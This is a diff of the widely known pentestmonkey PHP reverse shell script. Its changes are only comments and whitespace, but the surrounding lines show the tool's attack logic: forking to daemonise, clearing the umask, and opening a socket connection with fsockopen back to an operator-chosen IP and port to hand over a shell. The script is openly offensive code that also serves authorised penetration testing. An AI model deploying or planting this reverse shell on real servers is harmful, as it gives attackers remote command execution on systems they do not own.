@@ -1,10 +1,12 @@
 <?php
+
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-// This tool may be used for legal purposes only. Users take full responsibility
-// for any actions performed using this tool. The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then do not use this tool!
+
+// This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool.
+// The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool!
 // This tool may be used for legal purposes only.  Users take full responsibility
+
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 
 set_time_limit (0);
@@ -20,7 +22,7 @@ $debug = 0;
 
 // Daemonise ourself if possible to avoid zombies later
 // pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
+// Our php process and avoid zombies.  Worth a try...
 
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
@@ -53,9 +55,7 @@ chdir("/");
 // Remove any umask we inherited
 umask(0);
 
-//
 // Do the reverse shell...
-//
 
 // Open reverse connection
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
@@ -148,6 +148,3 @@ function printit ($string) {
 }
 
 ?> 
-
-
-
